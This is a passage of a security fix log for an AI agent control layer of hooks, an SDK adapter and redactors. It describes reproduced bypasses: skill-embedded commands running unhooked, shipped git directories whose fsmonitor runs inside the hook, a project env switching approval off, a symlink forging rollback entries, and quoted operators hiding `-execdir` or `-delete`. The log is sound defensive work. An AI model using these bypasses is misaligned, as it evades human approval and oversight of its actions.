  The comment, hooks/README.md, SECURITY.md §5 and the audit skill's
  verifier command (`--no-head`) say what the chain and the head show.
- Not changed: with the default key, derived from the host name, the chain
  and the head show accidental damage only (stated, as before);
  removing both files with a call a person approved, or a process outside
  the agent, leaves nothing to compare; the audit skill's records file has
  no head (its command hook refuses every command naming it but the append
  form and moving it aside).
- Tests: `tests/test_verify_audit_log.py::TestHead` (the head the hook
  writes, the verifier's report case, a cut log whose head the hook keeps,
  a removed log, a head another key signed, a log begun before the head, a
  head behind the log: all 7 failed before); three cases in
  `tests/test_pretooluse_hooks.py::test_a_call_that_writes_the_records_is_refused`
  (Write, `rm`, `mv` to `AUDIT.HEAD`; failed before), and reading the head
  passes. The restricted-PATH concurrency test lists `mv`, which the hook
  now runs; six concurrent runs keep the chain and the head.

#### 43. The binding's audit hook did not use a grounded tool's secrets (medium; partly closed by batch 6)

A deployment registers its credentials through each grounded tool's
`secrets` option; `recordToolCall`'s entry for a plain tool was redacted
with the default patterns, the layer's secrets (`configureLayer`, batch 6)
and its own argument, never with a tool's. The verifier's probe stored
`401 for key hk_live_...` in the hook's entry.

- Fix (`layer.ts`, `grounded.ts`): `registerSecrets` adds a grounded
  tool's secrets to the layer's: an array when the tool is defined, a
  function's values at each call. `layerSecrets()` gives both,
  `configureLayer` keeps the tools' (the tools stay defined) and
  `resetLayer` forgets them, so every entry the binding writes (the audit
  hook's, other tools', a control tool's) and every `persist` refusal use
  them.
- Not changed: a grounded tool returns its error to the runtime as its
  code threw it, so the model's tool message can hold a secret. That
  message is not among §6.7's places (records, anchors, notifications,
  diagnostics and `Error`s, traces, `persist` data), the Python adapter
  does not redact what a tool returns to the model either, and the
  verifier noted it as outside the list.
- Tests (`test/layer.test.ts`, "a grounded tool's secrets reach every
  entry"): the verifier's case, an array at definition reaching the hook's
  entry for `http_get` and refusing `persist` data; a function's values
  reaching it after a call, kept by `configureLayer`, forgotten by
  `resetLayer`. Both failed before. The verifier's `probe46` now finds no
  key in the grounded entry, the hook's entry or the store.

#### Siblings checked

- Both redactors, the refusal rule and the shell scan share each new rule;
  the vectors pin them for all three, and the fuzz runs above found no
  difference.
- `persistEntry`, the Python memory store, the adapter's TodoWrite check and
  the skills' hooks refuse through the shared rule, so #41's forms are
  refused there too.
- The audit skill's records chain is #42's sibling (no head); documented,
  with `--no-head`, above.

#### Documentation

SECURITY.md (§1.5: a bullet on the credential forms and encoded registered
values, the `audit` row of §5.4; §5: the audit log's head and the default
key); both redactors' module docs; the log hook's comment and
hooks/README.md (the head, the hook's reports, `--no-head`, the diagram);
the verifier's docstring and help; the persist skill's text and the audit
skill's verifier command; the binding's `secrets` option, `audit.ts`,
`layer.ts`, the binding README and the Standard Agents guide; the
`acs-core` README (`encodedForms`); CHANGELOG (Upgrading: credential forms,
the audit log's head and `--no-head`, the binding's tool secrets). The
Standard's §6.7 already forbids each leak and asks a host to recognise the
credentials it holds, and §6.4 only asks for a chain; no change there. No
version changes.

#### Checks after batch 8

- Python: `pytest tests/` (5407 passed, 18 skipped), and again the 1777
  tests that read the documents edited after it started; ruff check and
  format with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1983; the WebAssembly
  build reused); the binding's check and test (217, 2 skipped).
- Site: `npm run check`, `npm test` (1173).
- Probes (the verifier's, pointed at this worktree, each under `timeout
  120` and an address-space limit): `p1.py` finds every case of #41
  redacted and refused; the runner probe `p2.py` finds no password in any
  of its four modes; `p4.sh` flags every case but the letters-only Basic
  value in text, which the text rule leaves to data, as before, under sh
  and bash; the verifier's #42 steps (`head -n 2`, `sed -i '$d'` and one
  more call, `rm` and one more call) fail verification; `probe46` finds no
  host key in any stored entry. None left running.

### Batch 8, verified again: one sibling of #41

A later session confirmed batch 8 on 6199574 before returning: the
reported cases of #41 are redacted by both redactors and refused by
`holds_credential`, `holdsCredential` and `secret_in` under sh and bash
(identical results), the runner keeps no password in a failed step, #42's
head and #43's `registerSecrets` tests pass, and the records guard refuses
a call naming `audit.head`. One sibling of #41 was open.

#### 44. A quoted credential value was redacted to its first blank (medium; sibling of #41)

Batch 8 made `passphrase` a credential name, but in text every value rule
(an assignment, a credential option, a user option's password, a header
pair or tuple) read a value to its first blank, quote, `,` or `;` (`&` too
in an assignment), quoted or not. So `ValueError: bad config
{"passphrase": "correct horse battery staple"}` kept `horse battery
staple` in a failed step's trace, `{'password': 'it is a secret'}` kept
`is a secret`, `--password "correct horse battery"` kept two words, and a
`Cookie` pair or tuple (`[["Cookie", "theme=dark; session=..."]]`, a HAR's
`{"name": "Cookie", "value": ...}` in text) kept every cookie after the
first. Both redactors agreed (Python and TypeScript, the same output). JSON
data was not affected: a secret member's value is replaced whole.

- Fix (`redaction.py`, `redact.ts`, identically): a value that opens with a
  quote (escaped or not) is read to its closing quote of the same kind on
  its line, whitespace and all (`_quoted_value` / `quotedValue`: any
  character but that quote, a backslash or a line break, or a run of
  backslashes no such quote follows; 4 or more characters). Each of the
  four rules gains a quoted form for each quote kind, applied before its
  unquoted form (`_quoted_forms` / `quotedForms`; the pair and tuple heads
  and the assignment's prefix are named once, `_TUPLE_HEAD`, `_PAIR_HEAD`,
  `_ASSIGN`, and shared). A value whose quote does not close on its line
  is read as before, to a blank; one shorter than 4 characters is not
  read past its closing quote (`password: "x" and then "..."` is kept).
- Not changed: the refusal rule. Text's quoted values still count only
  with no whitespace (`token: "rotate monthly"` is prose and passes), so
  the shell scan and `credentials.json` are unchanged; JSON data is
  refused by its members, as before.
- Linear time: a quoted run ends at the next quote of its kind or a line
  break, so runs from different openings do not overlap; a run with no
  closing quote is read once more by the unquoted form. 8 new repeated
  shapes and 6 unclosed-quote shapes (a prefix and a 1 MB tail) in both
  timing tests: Python at most 3.1 s at 1 MB (about 1.5 times HEAD's time
  for the same text: eight more passes), 0.2 s at 100 KB, so linear.
- Tests: 4 vectors in `tests/conformance/secrets/redact.json`
  (`quoted_value_with_whitespace`, `quoted_pair_and_tuple_values`,
  `quoted_option_values`, and `quoted_value_controls`: a short quoted
  value, an unclosed quote, a line break), run by Python and the
  TypeScript package; `tests/test_runner.py::test_no_secret_in_a_failed_step`
  gains `raised_quoted_passphrase`; `test_a_quoted_credential_value_is_replaced_whole`
  and its TypeScript twin. With HEAD's redactors the first three vectors,
  the runner case and both direct tests fail; the controls pass on both.
- Parity: 4000 fuzzed strings over quotes, escaped quotes, blanks, line
  breaks, names, options and pair and tuple tokens give the same
  redaction, pointers and refusal in Python and TypeScript (0
  differences); 2 of them redact more than on HEAD, none less.
- Docs: both redactors' module docs, SECURITY.md §1.5's bullet on
  credential forms, CHANGELOG (the credential forms entry of Upgrading).
  No version changes.

#### Checks after #44

- Python: `pytest tests/` (5427 passed, 18 skipped), and again the tests
  that read the files edited after it started (`test_acs_core_package.py`,
  `test_version_lines.py`, `test_redaction.py`); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators'
  `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (2002; the
  WebAssembly build reused); the binding's check and test (217, 2
  skipped).
- Site: `npm run check`, `npm test` (1173).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs
  at most 1 MB: the batch's cases and the new quoted forms through both
  redactors and the shell scan (sh and bash), the timing shapes at 100 KB
  and 1 MB against HEAD's redactor, and the fuzz parity run above. None
  left running; the scratch files were removed.

## Round 2

### Batch 1: five reported defects

Five defects, each reproduced by an independent verifier on bfb18b1: one in
how the layers treat a call that loads commands no hook sees, four in how
repository content steers the plugin's hooks and the SDK through git. None
was fixed by an earlier batch (git log and round 1 checked). Each fix has
tests that fail on the code before it: the 90 tests of the two new files
were run with bfb18b1's hooks, rollback skill, mapper, tracker and recorder
put back, and 73 failed; the 17 that passed are the controls (an ordinary
marker, reads in the project, a repository without submodules, a signed
entry, other paths) and the fixtures' own checks (the shipped config runs
its programs; a read fetches into the submodule).

#### 1. A skill's shell commands ran with no hook (high); sibling: a subagent's hooks and MCP servers

Claude Code 2.1.330 runs the shell commands a skill's file embeds
(``!`cmd` `` and ```` ```! ```` blocks) as the skill loads: read from the
installed binary, the loader substitutes the call's arguments into the body
first (its error text names "the arguments or options substituted into
it"), then each command goes through the permission check, under the
skill's `allowed-tools`, and straight to the Bash tool's `call`, with no
PreToolUse or PostToolUse event (`tengu_prompt_shell_permission`). The
plugin's hook had `Skill` on UNGATED_TOOLS and the mapper mapped it to
`invoke` alone, so every command a skill embeds ran with no marker, no
approval and no log line, in bypassPermissions mode too. A skill preloaded
into a subagent does not run them (`isSkillPreload` sets
`readOnlySkillLoad`).

Sibling, same premise ("the calls it leads to are classified on their
own"): a subagent's definition can name `hooks` and `mcpServers` (both in
the binary's agent schema), commands Claude Code runs with no hook event
while the subagent runs; and a project's agent replaces a built-in one of
the same name (the binary merges built-in, plugin, user, project, flag and
policy agents by name, later ones winning), so no agent name is safe. Agent
and Task were ungated too.

- Fix (hook): `Skill`, `Agent` and `Task` leave UNGATED_TOOLS and are
  `mutate`, with an approval reason that says why ("the shell commands a
  skill's file embeds, and the hooks and MCP servers a subagent's
  definition names, run with no hook seeing them"). A Skill call's
  arguments are read by the records guard as a command's text is.
- Fix (SDK): `_UNSEEN_COMMANDS` (`Skill`, `Agent`, `Task`): the tool's own
  capability (`invoke`, `delegate`) and Bash's worst case, `mutate` and
  `send` (high risk, a checkpoint, approval), so a destination policy
  refuses the call (STANDARD 1.2.0 §4.4.2: the layer cannot tell where the
  commands send). The recorder still takes no checkpoint for a Skill call.
- Not covered, stated in SECURITY.md §5.5: a skill or command the person
  runs from the prompt (`/name`) is no tool call; Claude Code's
  `disableSkillShellExecution` setting turns its embedded commands off.
- Tests: `tests/test_unseen_commands.py` (the hook: F501 without a marker
  in every mode, the ask with the reason, F502 in bypassPermissions, F504
  for Skill arguments naming the records; the mapper's capabilities and
  flags for each tool and skill name; the adapter: F501, then ask with a
  checkpoint, and F504 under a destination policy), and
  `test_the_tools_that_load_unseen_commands_are_gated_in_both` in
  `tests/test_hook_lists_match_mapper.py`. Tests that stated the old
  behaviour were changed to the new one: `Skill`, `Agent` and `Task` left
  `test_a_tool_that_needs_neither_passes` (`test_pretooluse_hooks.py`) and
  `test_call_that_requires_no_approval_does_not_ask`
  (`test_tool_call_approval.py`), and `test_skill_is_invoke_whatever_the_skill`
  (`test_tool_bindings.py`) became a test of the worst case; the rate-limit
  tests of `test_sdk_e2e.py` that used Skill as a medium-risk tool use
  another one.

#### 2. A repository could make .claude a git directory: the hook ran its fsmonitor and the tracked-marker check was bypassed (high)

`git -C .claude ls-files --error-unmatch -- checkpoint.ok` asked whatever
git directory git found from `.claude`. A repository can ship `.claude`
itself as one (HEAD, objects/, refs/, an index, a config): git then read
the shipped config, ran its `core.fsmonitor` program inside the hook
(before any approval), and answered from the shipped index; with no config,
git took `.claude` for a bare repository, `ls-files` failed, and a tracked
marker the project shipped passed as untracked.

- Fix (hooks): `hgit` runs every git command of the pre-tool-use and take
  hooks with `-c core.fsmonitor=false -c core.hooksPath=/dev/null` and
  `GIT_NO_LAZY_FETCH=1` (a test keeps the two copies and the SDK's options
  the same); the rollback skill's command hook runs git with the same
  options. The marker check still asks from `.claude` (a linked or
  submodule `.claude` is read where it leads), but only when the git
  directory git finds there is one git made for a work tree
  (`git_dir_is_made`: `*/.git`, `*/.git/worktrees/*`, `*/.git/modules/*`;
  git refuses a path with a `.git` component in a repository, so no clone
  writes one): any other is F501 before `ls-files` runs. `ls-files` answers
  yes (F501) or no; any other answer is F501 too (it was "untracked").
  The take hook's `git diff --quiet HEAD` adds `--no-ext-diff
  --no-textconv`.
- The verifier's suggestion was to ask the project's repository instead;
  the git-directory rule closes both reproductions (the fsmonitor never
  runs, the bare `.claude` is refused) and keeps a linked `.claude`
  working.
- Fix (SDK): `grounded_agency/utils/git.py` (`SAFE_GIT_OPTIONS`,
  `safe_git_environment`, `git_dir_is_made`); the tracker's
  `_tracked_by_git` asks the same way (a state file in a git directory git
  did not make, or one git cannot answer for, is not loaded), and the
  recorder's `_tree_is_head` and the mapper's lookups run git with the same
  options.
- Tests: `TestShippedClaudeGitDir` in `tests/test_repository_content.py`
  (the fsmonitor sentinel is never written and the marker is refused, F501;
  the bare `.claude` with a tracked fresh marker, F501 in
  bypassPermissions; the tracker's state file in a shipped git directory is
  not trusted, and its fsmonitor does not run; an ordinary untracked marker
  still passes), and `test_both_checkpoint_hooks_run_git_alike`.

#### 3. git reads in an embedded git directory ran its config as observe (medium); sibling: `git stash create` there

The hook and the mapper classified `git status`, `git log -p`, `git show`,
`git diff`, `git ls-files` (and `git stash list|show`) as observe wherever
the call ran. In a directory of the work tree that a repository ships as a
git directory (`vendor/evil.git` with HEAD, objects/, refs/, a config and
info/attributes), git reads that config and runs its `core.fsmonitor`
(status, ls-files) and its textconv driver (log -p, show, diff). Sibling:
`git stash create` refreshes the index, so it ran the fsmonitor too, as a
`checkpoint` call, which needs nothing.

- Fix: `git_dir_is_content` (hook) and `git_dir_may_be_content` (mapper,
  a new attribute beside `git_may_fetch`, a failed lookup a yes): where the
  git directory git finds from the call's directory is not one git made for
  a work tree, every `git stash` form and every read-only git command is
  the worst case (the hook: `mutate`; the mapper: `mutate` and `send`).
  No repository there is a no, as before (`git status` outside a
  repository fails on its own).
- Why the name rule, not "differs from the project's git directory": the
  SDK knows no project directory, and a shipped git directory can never be
  a `.git` one; the rule gives the hook and the mapper the same answer.
- Tests: `TestEmbeddedGitDir` (the fixture's config runs its programs; each
  read and `git stash create`, from the git directory and from a directory
  inside it, is F501 in the hook and the worst case in the mapper, and no
  program runs; in the project they still observe; the lookup's answers).

#### 4. A shipped symbolic link let one approved `touch` forge a permanent rollback entry (medium)

The rollback check trusted any regular file in
`<git dir>/acs/checkpoints/commits/`, and the records guard read only the
call's text. A repository ships a stash-shaped merge commit M and a link
`notes/todo.md -> ../.git/acs/checkpoints/commits/M`; `touch notes/todo.md`
is an ordinary gated mutate, and once approved it creates the entry, after
which `git stash apply M` passes as a rollback, with no checkpoint and no
approval, every time.

- Fix (entries): the take hook writes in each entry the HMAC-SHA-256 of
  `acs-checkpoint-commit:<commit>` under the project's checkpoint key,
  `<git dir>/acs/checkpoints/key` (64 hex digits from `/dev/urandom`, drawn
  once and entered with `ln` so two runs agree, mode 600; a malformed key is
  replaced). The pre-tool-use hook's `recorded_commit` and the rollback
  skill's command hook pass a restore only for an entry that holds that
  HMAC (`openssl`; without it nothing is entered or recognised), and only
  in a git directory git made for a work tree (a shipped one could hold a
  key and entries of its own). An empty entry written before the upgrade
  restores nothing (a gated `mutate`; CHANGELOG Upgrading says so).
- Fix (guard): in a text of at most 4096 bytes, each word (a file tool's
  path whole; a command's or a skill's arguments as the shell passes them:
  `path_words`, quotes removed, split at blanks and `;&|<>(){}`$=`) is
  resolved from the call's directory with each symbolic link on it followed
  (`resolve_path`, no subshell, one `readlink` per link), and one that
  leads into the records is F504; so is a word whose links cannot be
  followed (a loop, more than 40 on one path, more than 200 in the call, so
  a chain named many times cannot hold the hook past its time limit). This
  closes the two-step variant: an approved `cp x notes/key.md` replacing
  the key through a link, then an entry.
- Not seen, stated in SECURITY.md §5.5: a path a command builds when it
  runs, a pattern the shell expands, a link a command reaches without
  naming it (copying a directory over one); such a command can read and
  replace the key, and is still a `mutate` a person approves.
- SDK: no sibling; the adapter's `has_commit` counts only checkpoints its
  own tracker took since it started, in memory.
- Tests: `TestCommitEntries` (a signed entry restores; an empty, junk or
  wrongly signed entry is F501 in two modes; eight commands and three file
  paths through links into the records, relative and absolute, are F504; a
  link loop; the 200-link budget, refused quickly; other paths still ask;
  400 words resolve quickly; the take hook enters nothing, writes no key
  and runs no program in a shipped git directory), and the lifecycle test
  that checks the entry's content and the key's mode;
  `test_an_unsigned_entry_restores_nothing` for the rollback skill's hook
  under sh and bash (bfb18b1's hook allowed an empty entry, exit 0, under
  both; now F503). The tests that entered commits by hand use
  `tests/conftest.py::enter_checkpoint_commit`, which signs them as the
  take hook does.

#### 5. A git read fetched from a partial-clone submodule's promisor as observe (medium; sibling of round 1 #12)

`git_may_fetch` read only the call's repository's configuration, but `git
log -p --submodule=diff` (or `diff.submodule=diff`, or `git status`) reads
a submodule's object store, where a partial clone fetches each missing
object from its promisor remote.

- Fix (hook and mapper alike): a git read also takes the worst case in a
  repository with submodules: `modules/` in its common git directory, or a
  gitlink (mode 160000) in its index (`git ls-files --stage -- :/`, run
  with `hgit`), initialised or not. The simplest fail-closed form: a read
  in a repository with submodules needs a checkpoint and approval;
  `git stash create` and a recorded restore keep their classes, as in a
  partial clone.
- Tests: `TestSubmodules` (the fixture: a full clone whose submodule was
  updated with `--filter=blob:none` from a file:// upstream, where `git log
  -p --submodule=diff` fetches; seven reads, `--sub=diff` included, are
  F501 in the hook and the worst case in the mapper; a gitlink with no
  submodule set up counts; a repository without submodules observes).

#### Siblings checked

- The other skill command hooks (audit, checkpoint, persist, send,
  transform) run no git; the log and stop hooks run none.
- The TypeScript package and the binding classify no git command and have
  no Skill or Agent tool.
- A restore into a shipped git directory: `recorded_commit` requires the
  call's git directory to equal the project's, which must be one git made.
- The take hook in a project whose git directory is shipped content writes
  no key, no entry and no marker naming a commit (tested).
- Round 1's fixes hold: the partial-clone rule (#12), the records guard's
  spellings, the tracked-marker rule, the shipped-records tests all pass
  unchanged.

#### Documentation

SECURITY.md §5.1 (classification of Skill, Agent and Task; git reads with
submodules and in shipped git directories; the records guard through links
and Skill arguments; the marker's git directory; signed entries) and §5.5
(the host gaps: what the guard does not see, the key, the person's own
slash commands; the adapter's classifier), `hooks/README.md`, the hooks'
header comments, the rollback skill's hook comment,
`docs/integrations/claude_agent_sdk.md` (the mapping table, the Skill
flow, git reads), and CHANGELOG [Unreleased] Upgrading (the SDK's Skill,
Agent and Task and Bash entries; the plugin hooks' entries). No version
changes.

#### Checks after batch 1

- Python: `pytest tests/` (5516 passed, 18 skipped), and again
  `tests/test_skill_hooks.py` after its last test was added (799 passed);
  ruff check and format with CI's lists; mypy; every `tools/validate_*.py`
  of CLAUDE.md, `validate_workflows.py --strict` and every domain catalog
  and example `--strict`; `sync_skill_schemas.py --check` and the
  generators' `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build and test (2002; the WebAssembly
  build reused); the binding's check and test (217, 2 skipped). No
  TypeScript source changed: neither classifies git commands nor has a
  Skill or Agent tool.
- Site: `npm run check`, `npm test` (1173).
- Probes, each under `timeout 120` (and a 4 GB address-space limit for the
  timing ones), inputs at most 7 KB: the `.claude` git-directory
  reproduction against bfb18b1's hook (its fsmonitor ran inside the hook)
  and the fixed one (refused, F501, nothing run); bfb18b1's and the fixed
  rollback skill hook on an empty entry under sh and bash (0, then F503);
  the pre-tool-use hook's time on a gated `touch` of 10, 400 and 900
  words (0.08 s, 0.14 s, and 0.07 s for the 4398-byte line, which is not
  resolved), on one word of 2040 path components (0.23 s), and on a git
  read (0.04 s). No CLI or nested agent was started; nothing was left
  running; the scratch repositories were removed.

### Batch 2: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1: one in
where the plugin's hooks take their settings, one in how both classifiers
read a command's name, one in how the SDK mapper reads a quoted operator,
and one in what `wrap_options()` does to the host's `setting_sources`. None
was fixed by an earlier batch (git log, round 1 and batch 1 checked; batch
1's fixes hold: its tests pass unchanged). Each fix has tests that fail on
the code before it: the 111 new tests were run with 6cf8c5d's three hooks,
mapper and adapter put back, and 77 failed; the 34 that passed are the
controls (settings set elsewhere, unrelated settings, unquoted names and
operators, `/bin/ls`), the fixtures' own checks (bash runs a program named
`git status`; `find f '<' -execdir` runs), one passthrough case the old code
already kept (`["user", "project", "local"]`), and sibling forms the old
code gated by accident (`find . -name ';' -delete` was split at the `;`,
leaving an unknown `-delete` command).

#### 6. A project's settings `env` switched the hooks' settings (low)

Claude Code applies the `env` of a project's `.claude/settings.json` and
`.claude/settings.local.json`, repository content, to every hook process it
starts, over the user's settings and the environment it started in (read
from the installed binary: `Object.assign(process.env, ...)` for every
enabled source; only the organization's managed hooks start without the
repository settings' env). The hooks read `ACS_HOOK_APPROVAL`,
`ACS_CHECKPOINT_MAX_AGE`, `AUDIT_HMAC_KEY` and `AUDIT_LOCK_WAIT` from their
environment, so a cloned repository could switch the approval floor off
(`ACS_HOOK_APPROVAL=off`: no F502 ask in default mode, no F502 block in
bypassPermissions), lengthen the maximum age, or sign the audit log with a
key it knows. No hook read the project's settings files, so none could tell
the person's value from the repository's.

- Fix (hooks): `project_layer_settings` (the same function in the
  pre-tool-use, take and log hooks; a test keeps them equal and checks that
  every `ACS_*` or `AUDIT_*` variable any hook reads is on its list) reads
  both files in `$CLAUDE_PROJECT_DIR/.claude/` (where Claude Code reads
  them: its `projectConfigDir` is the project directory it also passes as
  `CLAUDE_PROJECT_DIR`, which it sets after the env, so a project cannot
  move it) with jq and prints each of the four names their `env` holds, in
  any letter case (any JSON spelling: jq decodes `ACS_...`), or the
  file's name when jq cannot read it. While it prints anything:
  - the pre-tool-use hook blocks every call, ungated ones included (the
    record of any call would be signed with a key the repository may
    know), with `R407 SAFETY_CHECK_FAILED:` naming the settings and where
    they belong (`~/.claude/settings.json`, managed settings, the
    environment Claude Code starts in); the marker is left in place;
  - the log hook writes no line (exit 1 with the reason; the log and its
    head are left as they are);
  - the take hook writes no marker.
- Why a refusal and not "ignore the value": the hook cannot know the
  person's value either (the project's replaces it in the environment), so
  any value it used would be a guess; `AUDIT_LOCK_WAIT` is on the list
  because the test requires every setting a hook reads to be.
- Not covered, stated in SECURITY.md §5.5 and the hooks README: Claude Code
  started in the home directory reads `~/.claude/settings.json` as the
  project's settings too, so there the settings must come from the
  environment; settings Claude Code takes from elsewhere for a project are
  not read.
- Tests: `tests/test_project_settings.py` (each setting in either file, in
  another letter case, as a JSON escape and named twice, in three modes:
  R407 and the marker unused; Read, a read-only Bash and Write refused
  alike; an unreadable file refused; unrelated settings, an `env` that is
  not an object and a non-object file change nothing; the log hook writes
  no line and keeps the head; the take hook writes no marker; the controls:
  `off` from the environment still leaves approval to Claude Code, and a
  key from the environment still signs; the function-equality and
  coverage test).

#### 7. A quoted command name with a blank read as a two-word entry (medium)

The hook compared each read-only entry with `${words[0]}` and with
`${words[0]} ${words[1]}`, and the mapper's `_is_read_only` with `words[0]`
and `" ".join(words[:2])`: the single dequoted word `git status` (from
`"git status"`, `'git status'`, `g"it status"`, `git" "status`) equals the
entry "git status". Bash runs the program named `git status` from PATH, not
git; its writes and git-directory checks (keyed on `words[0] == "git"`)
were skipped too. The mapper also passed `"git branch"`, `"git remote" add
o x`, `"pip list"` and `"pip show"`.

- Fix (hook and mapper alike): a first word holding a blank (any
  whitespace) or a slash names a program on no list: the worst case
  (`mutate` in the hook, `mutate` and `send` in the mapper). A one-word
  entry is compared with the first word, a two-word entry's program and
  subcommand with the first and second words, each one word.
- Tests: `test_a_command_name_with_a_blank_or_a_slash_is_gated_in_both`
  (17 commands, hook F501 and mapper worst case),
  `test_a_quoted_name_without_a_blank_is_still_the_command` (`git
  "status"`, `"git" "status"`, `"ls" -la` stay read-only), and
  `test_bash_runs_a_program_named_with_a_blank` (the premise) in
  `tests/test_hook_lists_match_mapper.py`.

#### 8. The SDK classifier dropped the word after a quoted `<` (high); sibling: quoted separators

shlex in punctuation mode gives a quoted or escaped operator (`'<'`, `"<"`,
`\<`, `';'`, `'|'`, `'&&'`, `\;`) as the bare operator. `_simple_commands`
compared the real and masked token streams by length only, then read every
real token that looked like an operator as one: `find in.txt '<' -execdir
sh -c '...' sh {} +` skipped `-execdir` as a redirection's file and was
`observe` (the shell runs it: the verifier's probe wrote `id` output), as
were `find . ! -name '<' -delete` (deletes everything), `-fprint`, `sort
'<' -o`, and `git log '<' --output=`. The adapter allowed them with no
checkpoint, no approval and no destination check. Sibling (same cause):
a quoted separator split the line, so `grep ';' f` was two commands
(`grep`, and `f`, an unknown command: the worst case), and `find . -name
';' -delete` was gated only because its `-delete` became a command of its
own. The plugin's hook was not affected: it
gates any line holding an operator character, quoted or not.

- Fix (mapper): a token is an operator only when the masked reading has an
  operator at the same position (the two readings are always the same
  length: about 106,000 fuzzed lines of quotes, escapes and operators found no
  difference, and an operator in the masked reading always equals the real
  one); any other token is the word the shell passes. Should the readings
  ever differ in length, the line is the worst case (it fell back to
  "every word expanded", which would now have made every operator a word).
  A redirection whose file is missing or is an operator (`cat <`, `ls >
  ;`, a syntax error) is the worst case.
- Effect on read-only lines: a quoted operator in an allow-listed command
  is now a word (`grep ';' f`, `grep '|' f`, `echo '(' x` observe, where
  the last was the worst case).
- Tests: `TestQuotedOperators` in `tests/test_bash_classification.py` (the
  premise: bash runs `-execdir` past `'<'`; six lines whose following word
  is now read; seven read-only lines; unquoted operators still separate and
  redirect; a redirection with no file; the adapter denies the `-execdir`
  line with F501, and F504 under a destination policy), and
  `test_a_quoted_operator_hides_no_word_in_either` (14 lines, mapper gated
  and hook F501) in `tests/test_hook_lists_match_mapper.py`.

#### 9. `wrap_options` overrode the host's `setting_sources` (high)

`wrap_options` set `setting_sources` to the host's value or `["project"]`,
then added `"project"`: `[]` (the SDK's isolation mode, which its own
documentation names for a `cwd` that may be untrusted, since project
settings can run hooks) became `["project"]`, so the repository's
`.claude/settings.json` was loaded (its hooks run commands with no check,
its `env` and permission rules apply; the SDK runs the CLI non-interactively,
which skips the trust dialog); `None` (every source, the CLI's default)
became the project's settings alone, dropping the user's and local deny
rules and hooks; `["user"]` became `["user", "project"]`. The docstring,
the guide, SECURITY.md and the conformance statement said nothing of it.

- Fix: `setting_sources` is passed through unchanged (it is no longer in
  the replaced fields). A host that wants a project's skills loaded
  includes `"project"` itself; the docstring, the SDK guide, SECURITY.md
  §5.5 and CHANGELOG Upgrading say so. `grounded_query` and
  `GroundedClient`, which wrap default options, now keep `None`.
- Tests: `test_wrap_options_keeps_the_hosts_setting_sources` in
  `tests/test_sdk_integration.py` (`None`, `[]`, `["user"]`, `["local"]`,
  `["user", "local"]`, all three: the wrapped options keep the value, and
  the SDK transport's command line, built with `cli_path=/bin/false` and
  no process started, carries the same `--setting-sources` flag, or none
  for `None`).

#### Siblings checked

- Settings: the Python SDK and adapter read no layer setting from the
  environment (they take a `GroundedAgentConfig`; the only environment
  they touch is `GIT_NO_LAZY_FETCH` for their own git commands); the
  TypeScript package and the binding read no `process.env`. The stop hook
  and the skill command hooks read none of the settings (the audit skill's
  HMAC under `AUDIT_HMAC_KEY` is a command the agent runs, which the
  pre-tool-use hook gates). Claude Code's own lists that strip
  `BASH_ENV`, `LD_*`, `GIT_*`, `SHELLOPTS`, `PS4` and others from some
  environments were seen in the binary, statically; that a project's `env`
  cannot set them for a hook was not checked at run time (the CLI may not
  be run here).
- Names: the take hook compares `git`, `stash` and `create` word by word;
  the rollback skill's hook finds restores by the unquoted words `git stash
  pop|apply` (a quoted `"git stash" apply X` is no restore it sees, and the
  pre-tool-use hook gates it as a program on no list); the audit skill's
  hook compares one program name; `_classify_single_command` and the stash
  forms compare words exactly.
- Operators: no other SDK code splits a command line (`_tokens` and
  `_simple_commands` are its only users); the hooks refuse any operator
  character, quoted or not, before reading words.
- `wrap_options`' other fields: `enable_file_checkpointing` is set; output
  format, budget, model, turns and agents are filled only when the host
  left them unset; `allowed_tools` and the permission settings are kept.

#### Documentation

SECURITY.md §5.1 (the settings rule, the first-word rule, the log and take
hooks under project settings) and §5.5 (the host gap for the home
directory; the adapter's `setting_sources` and its reading of quoted
operators and names), `hooks/README.md` (where the settings belong, the
first-word rule, the HMAC key), the three hooks' header comments,
`docs/integrations/claude_agent_sdk.md` (the classifier's reading of quoted
operators and names; `setting_sources`), the adapter's docstring, and
CHANGELOG [Unreleased] Upgrading (the SDK's `wrap_options` and Bash
entries; the plugin hooks' entries). The Standard's text was not changed:
it states the rules these fixes apply (§5.18.3 classification to the worst
case, §5.18.7, §5.18.8 R407), not the plugin's settings or the shell's
quoting. No version changes.

#### Checks after batch 2

- Python: `pytest tests/` (5633 passed, 18 skipped), and again the three
  changed test files after the last edit (322 passed); ruff check and
  format with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators'
  `--check`; `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check and test (2002; the
  WebAssembly build reused); the binding's check and test (217, 2 skipped).
  No TypeScript source changed: neither reads a layer setting from the
  environment, classifies a Bash command or wraps SDK options.
- Site: `npm run check`, `npm test` (1173).
- Probes, each under `timeout 120` or less (and a 4 GB address-space limit
  for the timing ones), inputs at most 564 KB: the pre-tool-use hook with a
  project `env` naming `ACS_HOOK_APPROVAL` (R407 for Bash in
  bypassPermissions and for Read), its time on a Read call (0.01 s a run;
  0.15 s with a 564 KB settings file of 5000 keys); the log hook with and
  without the project setting; the classifiers on the reported commands;
  the mapper on 4 KB lines of quoted operators (4 to 140 ms, the same as
  before the change: the 140 ms is the pattern checks that run before the
  line is read). No CLI or nested agent was started; nothing was left
  running; the scratch repositories were removed.

### Batch 3: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1: one in
how the checkpoint tracker writes its files, three in how the SDK adapter's
permission callback relates to its PreToolUse hook. None was fixed by an
